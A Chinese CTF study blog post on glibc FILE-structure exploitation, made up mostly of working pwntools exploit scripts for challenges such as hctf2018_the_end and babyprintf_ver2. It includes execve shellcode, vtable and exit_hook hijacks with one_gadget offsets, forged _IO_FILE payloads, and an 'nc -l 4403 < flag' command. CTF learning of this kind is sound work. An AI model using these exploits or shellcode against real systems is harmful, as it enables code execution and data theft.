---
title: 学io的记录
date: 2021-08-02 18:03:18
tags:
  - io
---


## hctf2018_the_end
* 开了pie对text段的断点 `b *$rebase(addr)`
* 对libc地址的断点 `b *(&_IO_cleanup+137)`
* one_gadget多个  `one_gadget elf --level 1`
* 栈回溯的方式追踪程序流
* 手动修改 `set {long}&_IO_2_1_stdout_->vtable = arr`
* 运行shellcode
```c
#include <stdio.h>

int main(void)
{
	unsigned char shellcode[]="\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05";
	((void (*)(void))shellcode)();

	return 0;
}
// gcc -g -z execstack -o test test.c


```
### exp
```python
#_*_coding:utf-8_*_
#!/usr/bin/env python
from pwn import *


# 劫持vtable exit()->vtable.__setbuf()
context.log_level = "debug"
s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)



p = process("./the_end")
# p = remote("node4.buuoj.cn",26042)
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
pause()
ru("gift ")
sleep = int(ru(",")[:-1],16)
ru(";)")
print("sleep => 0x%x"%sleep)
libc.address = sleep - libc.sym["sleep"]
## vtable <- _IO_list_all+0xd8
## setbuf <- vtable+11*8
vtable = libc.sym["_IO_2_1_stdout_"]+0xd8
fake_vtable = libc.sym["__realloc_hook"]-0x58
print("vtable => 0x%x\nfake vtable => 0x%x\noffset => 0x%x"%(vtable,fake_vtable,fake_vtable&0xffff))

one = [ _ + libc.address for _ in (0xf03b0,0x45226,0x4527a,0xf03a4,0xf1247)]
target = one[0]

addr1 = vtable
byte1 = fake_vtable&0xff
addr2 = vtable+1
byte2 = (fake_vtable>>8)&0xff
# b *$rebase(0x95f)

payload = ""
payload += p64(addr1)
payload += chr(byte1)
payload += p64(addr2)
payload += chr(byte2)
payload += p64(libc.sym["__realloc_hook"])
payload += chr(target&0xff)
payload += p64(libc.sym["__realloc_hook"]+1)
payload += chr((target>>8)&0xff)
payload += p64(libc.sym["__realloc_hook"]+2)
payload += chr((target>>16)&0xff)
s(payload)
info(hex(target))
sl("nc -l 4403 < flag")
sh()

# nc -n ip 4403
```
* exit_hook
    * 在libc-2.23中
    
    `exit_hook = libc_base+0x5f0040+3848`

    `exit_hook = libc_base+0x5f0040+3856`

    * 在libc-2.27中

    `exit_hook = libc_base+0x619060+3840`

    `exit_hook = libc_base+0x619060+3848`

```python
#_*_coding:utf-8_*_
#!/usr/bin/env python
from pwn import *
import sys

# exit() -> blablahander -> dl_fini -> lock unlock

# context.log_level = "debug"
s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n

# p = process("./the_end",env={"LD_PRELOAD":"./libc-2.27.so"})
p = remote("node4.buuoj.cn",27917)
libc = ELF("libc-2.27.so")
ld = ELF("/lib/x86_64-linux-gnu/ld-2.27.so")

def exp(id):
	# pause()
	ru("gift ")
	sleep = int(ru(",")[:-1],16)
	ru(";)")
	libc.address = sleep - libc.sym["sleep"]
	print("sleep => 0x%x"%sleep)
	print("ld base => 0x%x"%ld.address)
	_rtld_global = ld.sym["_rtld_global"]
	_rtld_global = libc.address + 0x619060
	src = _rtld_global+3848
	one_gadget = [libc.address + _ for _ in (0x4f2c5,0x4f322,0xe569f,0xe5858,0xe585f,0xe5863,0x10a38c,0x10a398)]
	ogg = one_gadget[id]
	payload = ""
	payload += p64(src+0)
	payload += chr(ogg&0xff)
	payload += p64(src+1)
	payload += chr((ogg>>8)&0xff)
	payload += p64(src+2)
	payload += chr((ogg>>16)&0xff)
	payload += p64(src+3)
	payload += chr((ogg>>24)&0xff)
	payload += p64(src+4)
	payload += chr((ogg>>32)&0xff)
	payload += ("exec 1>&0")
	sl(payload)
	info(hex(ogg))
	sh()

exp(int(sys.argv[1]))

######################################
# 
# 0x7ffff7ffdf60 (_rtld_global+3840) —▸ 0x7ffff7dd40e0 (rtld_lock_default_lock_recursive) ◂— add    dword ptr [rdi + 4], 1
# 0x7ffff7ffdf68 (_rtld_global+3848) —▸ 0x7ffff7dd40f0 (rtld_lock_default_unlock_recursive) ◂— sub    dword ptr [rdi + 4], 1
# trigger
# 0x7ffff7de3ba9 <_dl_fini+105>    call   qword ptr [rip + 0x21a3b1] <rtld_lock_default_lock_recursive>
# 0x7ffff7de3c80 <_dl_fini+320>    call   qword ptr [rip + 0x21a2e2] <rtld_lock_default_unlock_recursive>
# 
########################################

```
### _IO_buf_base
```python
#!/usr/bin/env python
from pwn import *

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)

context.log_level = "debug"

p = process("./stackoverflow")
# p = remote("node4.buuoj.cn",25475)
libc = ELF("/home/giles/tools/glibc-all-in-one/libs/2.24-9ubuntu2.2_amd64/libc.so.6")
# GNU C Library (Ubuntu GLIBC 2.24-9ubuntu2.2) stable release version 2.24, by Roland McGrath et al.

sal("bro:","A"*7)
libc.address = u64(ru("\x7f")[-6:].ljust(8,"\x00")) - 0x7dd52
info("libc base => 0x%x"%libc.address)

ru("please input the size to trigger stackoverflow: ")
sl(str(0x6c28e8))
ru("please input the size to trigger stackoverflow: ")
sl(str(0x300000))
ru("padding and ropchain: ")
sl("aaaaaaa")


ru("please input the size to trigger stackoverflow: ")
payload = ""
payload += p64(libc.sym["__malloc_hook"]+8)
s(payload)
ru("padding and ropchain: ")
sl("aaaa")
for _ in range(len(payload)-1):
	sl("")
r()
pause()
payload = p64(libc.sym["__malloc_hook"]+8)
payload += p64(0)*6
payload += p64(0xffffffffffffffff)
payload += p64(0)
payload += p64(0x00007fdbaf570770-0x7fdbaf1ad000+libc.address)
payload += p64(0xffffffffffffffff)
payload += p64(0)
payload += p64(0x00007fdbaf56e9a0-0x7fdbaf1ad000+libc.address)
payload += p64(0)*3
payload += p64(0x00000000ffffffff)
payload += p64(0)*2
payload += p64(0x00007fdbaf56b400-0x7fdbaf1ad000+libc.address)
payload += p64(0)*41
payload += p64(libc.address+0x4557a)
payload += p64(libc.sym["realloc"]+16)
sl(payload)

# malloc -> malloc_hook -> realloc -> realloc_hook -> onegadget
sh()
```
### babyprintf_ver2
* 
``` python
#_*_coding:utf-8_*_
from pwn import *

context.log_level='debug'

s   = lambda buf            : p.send(buf)
sl  = lambda buf            : p.sendline(buf)
sa  = lambda delim, buf     : p.sendafter(delim, buf)
sal = lambda delim, buf     : p.sendlineafter(delim, buf)
sh  = lambda                : p.interactive()
r   = lambda n=None         : p.recv(n)
ra  = lambda t=tube.forever :p.recvall(t)
ru  = lambda delim          : p.recvuntil(delim)
rl  = lambda                : p.recvline()
rls = lambda n=2**20        : p.recvlines(n)

p = process("./babyprintf_ver2")
elf = ELF("./babyprintf_ver2")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")


def file(_flags=0,
		_IO_read_ptr=0,
		_IO_read_end=0,
		_IO_read_base=0,
    	_IO_write_base=0,
    	_IO_write_ptr=0,
    	_IO_write_end=0,
        _IO_buf_base=0,
        _IO_buf_end=0,
        _IO_save_base=0,
        _IO_backup_base=0,
        _IO_save_end=0,
	    _markers=0,
	    _chain=0,
	    _fileno=0,
	    _flag2=0,
	    _lock=0):
    f = p64(_flags) + p64(_IO_read_ptr) + \
        p64(_IO_read_end) + p64(_IO_read_base) + \
        p64(_IO_write_base) + p64(_IO_write_ptr) + \
        p64(_IO_write_end) + p64(_IO_buf_base) + \
        p64(_IO_buf_end) + p64(_IO_save_base) + \
        p64(_IO_backup_base) + p64(_IO_save_end) + \
        p64(_markers) + p64(_chain) + \
        p64(_fileno) + p64(_flag2) + \
        p64(0) + p64(_lock)
    f = f.ljust(0xd0,'\x00') # sizeof(struct _IO_FILE) = 0xd8;
    return f


ru("ocation to ")
stdout = int(r(len("0x5606da8ef010")),16)+0x10
elf.address = stdout - 0x202020

info("stdout => 0x%x"%stdout)
payload = ""
payload += "A"*16
payload += p64(stdout+0x8)
payload += file(_flags=0xfbad2887,
				_IO_write_base=elf.got["puts"],
				_IO_write_ptr=elf.got["puts"]+8,
				_IO_read_end=elf.got["puts"],
				_lock = stdout+0x100,
				_fileno = 1,)
payload = payload.ljust(0x1ff,"\x00")
raw_input("break 1")
sl(payload)
puts = u64(ru("\x7f")[-6:]+"\x00\x00")
info("puts => 0x%x"%puts)
libc.address = puts-libc.sym["puts"]

ogg = [libc.address+_ for _ in (0x4f3d5,0x4f432,0x10a41c)]
og = ogg[1]
payload = p64(og)
payload += "B"*8
payload += p64(stdout+0x8)
payload += file(_flags=0xfbad2887,
				_IO_write_ptr=libc.sym["__malloc_hook"],
				_IO_write_end=libc.sym["__malloc_hook"]+8,
				_lock = stdout+0x100,
				_fileno = 1,)
payload = payload.ljust(0x1ff,"\x00")
raw_input("break 2")
sl(payload)
r()
sl("%100000c")
sh()

```
## 参考
[IO FILE 之任意读写](https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write)